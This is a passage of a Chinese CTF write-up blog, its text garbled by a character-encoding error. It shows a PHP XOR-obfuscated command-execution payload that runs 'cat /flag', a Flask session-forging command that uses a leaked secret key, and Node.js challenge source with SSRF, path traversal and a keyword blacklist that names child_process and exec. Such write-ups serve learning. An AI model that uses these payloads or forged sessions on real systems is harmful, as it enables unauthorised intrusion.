single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"^<span class="token interpolation"><span class="token variable">$i</span></span><span class="token interpolation"><span class="token variable">$j</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"==><span class="token interpolation"><span class="token variable">$exp</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆpayload</p><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>æç¤ºå›¾ç‰‡ç‚¹å‡»å¯ä»¥ä¸‹è½½ï¼Œä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151413306.png"></p><p>è¯»å–åˆ°ç¯å¢ƒå˜é‡ä¸­çš„<code>SECRET_KEY=Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR</code>ï¼Œæºç è¯»ä¸åˆ°ä½†æ˜¯çŸ¥é“æ˜¯pythonç¯å¢ƒï¼Œflask-sessionä¼ªé€ </p><pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py encode -s &quot;ç§é’¥&quot;  -t &quot;å†…å®¹&quot; python3 flask_session_cookie_manager3.py encode -s &quot;Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR&quot;  -t &quot;&#123;&#39;balance&#39;:114514&#125;&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>æºç å–µå–µ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> pug <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> morgan <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> multer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">dest</span><span class="token operator">:</span> <span class="token string">'./dist'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">morgan</span><span class="token punctuation">(</span><span class="token string">'short'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/uploads"</span><span class="token punctuation">,</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/template"</span><span class="token punctuation">,</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> action <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action<span class="token operator">?</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action<span class="token operator">:</span><span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//actionå‚æ•°è¿‡æ»¤æ–œæ æ </span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Errrrr, You have been Blocked"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    file <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/'</span><span class="token operator">+</span> action <span class="token operator">+</span><span class="token string">'.pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> html <span class="token operator">=</span> pug<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç”¨pugå¼•æ“æ¸²æŸ“</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/file_upload'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> ip <span class="token operator">=</span> req<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>remoteAddress<span class="token punctuation">;</span><span class="token comment">//ä¸èƒ½ç”¨X-Forwarded-Forä¼ªé€ </span>    <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ip<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        obj<span class="token punctuation">.</span>msg<span class="token operator">=</span><span class="token string">"only admin's ip can use it"</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span>     <span class="token punctuation">&#125;</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>path<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> file_path <span class="token operator">=</span> <span class="token string">'/uploads/'</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mimetype <span class="token operator">+</span><span class="token string">"/"</span><span class="token punctuation">;</span>          <span class="token comment">//ä»»æ„æ–‡ä»¶ä¸Šä¼ å¹¶ä¸”é€šè¿‡MIMEç±»å‹æ¥ä¿å­˜æ–‡ä»¶ä½ç½®ï¼ŒMIMEå¯æ§æ‰€ä»¥å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Š</span>            <span class="token keyword">var</span> file_name <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>originalname            <span class="token keyword">var</span> dir_file <span class="token operator">=</span> __dirname <span class="token operator">+</span> file_path <span class="token operator">+</span> file_name            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">"file type error"</span><span class="token punctuation">;</span>                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>dir_file<span class="token punctuation">,</span>data<span class="token punctuation">)</span>                obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                    <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'upload success'</span><span class="token punctuation">,</span>                    <span class="token literal-property property">filename</span><span class="token operator">:</span> file_path <span class="token operator">+</span> file_name                <span class="token punctuation">&#125;</span>             <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/source.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/core'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">;</span>    <span class="token keyword">var</span> resp <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'http://localhost:8081/source?'</span> <span class="token operator">+</span> q<span class="token comment">//å¯¹å‚æ•°qè¿›è¡Œå¤„ç†å¹¶è¿›è¡Œæœ¬åœ°è®¿é—®ï¼Œçº¯çº¯SSRF</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">var</span> trigger <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"&lt;p>error occurs!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    resp<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token string">"ECONNRESET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Timeout occurs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token keyword">return</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                         resps <span class="token operator">=</span> chunk<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>resps<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                           res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                     <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                         res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"search param 'q' missing!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> evilwords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"global"</span><span class="token punctuation">,</span> <span class="token string">"process"</span><span class="token punctuation">,</span><span class="token string">"mainModule"</span><span class="token punctuation">,</span><span class="token string">"require"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"child_process"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"!"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> arrayLen <span class="token operator">=</span> evilwords<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrayLen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> trigger <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>evilwords<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> server <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8081</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> host <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address    <span class="token keyword">var</span> port <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>port    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Example app listening at http://%s:%s"</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>èƒ½åˆ†æçš„éƒ½å†™åˆ°ä»£ç æ³¨é‡Šé‡Œé¢äº†ï¼Œä¸‹é¢è¦åˆ©ç”¨çš„ä¸€ä¸ªnode.jsæ—©æœŸçš„æ‹†åˆ†æ”»å‡»æ¼æ´ï¼Œå…ˆè´´ä¸€ä¸ªå¤§ä½¬<a href="https://blog.csdn.net/cjdgg/article/details/119068329">wp</a></p><p>æ‹†åˆ†æ”»å‡»ï¼Œæ˜¯æŒ‡åœ¨HTTPè¯·æ±‚å¤´ä¸­ä¼ªé€ å‡º\r\nè½¬ä¹‰å­—ç¬¦ï¼Œæ¥ä½¿å¾—HTTPæœåŠ¡å™¨å°†ä¸€ä¸ªè¯·æ±‚å½“ä½œä¸¤ä¸ªæˆ–å¤šä¸ªè¯·æ±‚æ‰§è¡Œï¼Œå½“ç„¶ï¼Œå¤§éƒ¨åˆ†æœåŠ¡å™¨éƒ½è€ƒè™‘åˆ°äº†è¿™ç§æƒ…å†µï¼Œä¼šå°†ä¼ æ¥çš„å†…å®¹è¿›è¡Œè½¬è¯‘ï¼Œnode.jsä¹Ÿä¸ä¾‹å¤–ï¼Œä½†æ˜¯åœ¨node.js 8ç‰ˆæœ¬åŠä»¥å‰ï¼Œnode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦ï¼Œå¯¼è‡´å­—ç¬¦ä¼šè¢«æˆªæ–­ï¼Œä½¿å¾—æˆ‘ä»¬éœ€è¦çš„\r\nå‡ºç°ï¼Œå…·ä½“å¯è§ä¸‹é¢çš„å†…å®¹</p><blockquote><h1 id="HTTPè¯·æ±‚è·¯å¾„ä¸­çš„unicodeå­—ç¬¦æŸå"><a href="#HTTPè¯·æ±‚è·¯å¾„ä¸­çš„unicodeå­—ç¬¦æŸå" class="headerlink" title="HTTPè¯·æ±‚è·¯å¾„ä¸­çš„unicodeå­—ç¬¦æŸå"></a>HTTPè¯·æ±‚è·¯å¾„ä¸­çš„unicodeå­—ç¬¦æŸå</h1><p>ä¸€åˆ‡éƒ½å¼€å§‹äºæˆ‘è°ƒè¯•çš„ä¸€ä¸ªéå…³è”çš„unicodeå¤„ç†issueï¼Œå¹¶æœ€ç»ˆå°†æˆ‘å¼•å‘ä¸€ä¸ªé”™è¯¯æŠ¥å‘Šï¼š<a href="https://github.com/nodejs/node/issues/13296">bug report against the Node.js <code>http</code> module</a>,æŠ¥å‘Šä¸­æåˆ°ï¼š</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png" alt="img"></a></p><p>æ¢å¥è¯è¯´ï¼ŒæŠ¥å‘Šè€…ä½¿ç”¨Node.jså‘ç‰¹å®šè·¯å¾„å‘å‡ºHTTPè¯·æ±‚ï¼Œä½†æ˜¯å‘å‡ºçš„è¯·æ±‚å®é™…ä¸Šè¢«å®šå‘åˆ°äº†ä¸ä¸€æ ·çš„è·¯å¾„ï¼æ·±å…¥ç ”ç©¶ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ªé—®é¢˜æ˜¯ç”±Node.jså°†HTTPè¯·æ±‚å†™å…¥è·¯å¾„æ—¶å¯¹unicodeå­—ç¬¦çš„æœ‰æŸç¼–ç å¼•èµ·çš„ã€‚</p><p>è™½ç„¶ç”¨æˆ·å‘å‡ºçš„<code>http</code>è¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸²ï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡ºã€‚JavaScriptæ”¯æŒunicodeå­—ç¬¦ä¸²ï¼Œå› æ­¤å°†å®ƒä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„unicodeç¼–ç ã€‚å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç 